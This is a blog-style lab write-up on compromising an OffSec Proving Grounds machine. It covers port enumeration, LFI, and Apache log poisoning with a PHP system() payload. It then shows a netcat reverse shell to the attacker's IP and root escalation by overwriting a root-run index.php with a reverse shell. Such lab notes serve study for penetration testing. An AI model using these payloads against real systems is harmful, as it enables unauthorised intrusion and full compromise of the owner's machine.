---
title: OffSec PG - Solistice
date: 2021-12-19 12:00:00 +0500
categories: [Lab Practice Notes, OffSec Proving Grounds]
tags: [oscp,lab,offsec-proving-grounds]
image:
  path: /assets/img/covers/pg-cover.jpeg
  alt: PG Artwork
---

## Enumeration

Machine IP &rarr; `192.168.124.72`

### Network Scan

Nmap scan &rarr; `nmap -A -Pn -p- -T4 -o nmap.txt 192.168.124.72`

OS Detection &rarr;  `OS: Linux; CPE: cpe:/o:linux:linux_kernel`

| **Port** | **Service** | **Other details (if any)**                                                     |
| -------- | ----------- | ------------------------------------------------------------------------------ |
| 21       | FTP         | pyftpdlib 1.5.6                                                                |
| 22       | SSH         | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                 |
| 25       | SMTP        | Exim smtpd                                                                     |
| 80       | HTTP        | Apache httpd 2.4.38 ((Debian))                                                 |
| 2121     | FTP         | pyftpdlib 1.5.6 &rarr; *Anonymous Login Allowed*                                    |
| 3128     | HTTP Proxy  | Squid http proxy 4.6                                                           |
| 8593     | HTTP        | PHP cli server 5.5 or later (PHP 7.3.14-1) &rarr; *PHPSESSID HTTPOnly flag not set* |
| 54787    | HTTP        | PHP cli server 5.5 or later (PHP 7.3.14-1)                                     |
| 62524    | \-          | \-                                                                             |

### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.124.72 -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php`

Nothing interesting was revealed in any of the ports.

---

## Exploitation

### LFI

The web server running at port 8593 has the ability to list books via PHP. This is done via a get parameter. Trying LFI with `../../../../../../etc/passwd` confirms LFI and gives the result of the file to list possible users which includes `www-data`, `miguel` and `root`.

### Transition LFI to Apache log poisoning

The default apache error logs are located at `/var/log/apache2/error.log`. This is readable on the browser because of the LFI vulnerability. Therefore, adding php code to an attempt would add it to the error log and subsequently render it on the webpage.

Therefore visiting the url `http://192.168.124.72/<?php system($_GET['cmd']);?>` should add it to the error log, thereby giving an RCE for the get request parameter in the LFI url. The access via the browser encodes the special characters, therefore a burp repeater request modification should do the trick.

### Exploiting the RCE

With the php payload injected into the access log, the lfi url can be modified to add the parameter value for the `cmd` variable. Testing with `id` works. Next, this can used to test if nc, wget, etc. exist on the system which can be used to create a shell payload. This is the RCE on the server.

Both netcat and bash shell exist, therefore sending a payload `nc -e /bin/bash 192.168.49.124 3002` with a listener active on the local machine gives a shell with the user `www-data`.

---

## Privilege Escalation

Looking at the setuid files and directories using `find / -perm -u=s 2>/dev/null`, there is a server running at `/var/tmp/sv` which is a directory that is owned by `root` and is world-writable.

This has an `index.php` file which just prints that the site is under construction. This cannot be observed from any of the ports enumerated above. Checked the status of this under processes using `ps aux | grep root | grep sv`. This confirms that the server is actually running, but on localhost only. Therefore, this php file can be edited to have a payload that connects back to the attacker machine to get a reverse shell. Due to the permissions, this would be the root shell.

The pentest monkey reverse shell is uploaded to the server and the contents of the `index.php` file are overwritten with them. Then the execution can be done as follows on the low privileged shell &rarr; `curl http://localhost:57/index.php`

This gives a shell as the `root` user and thus the root flag as well.

---
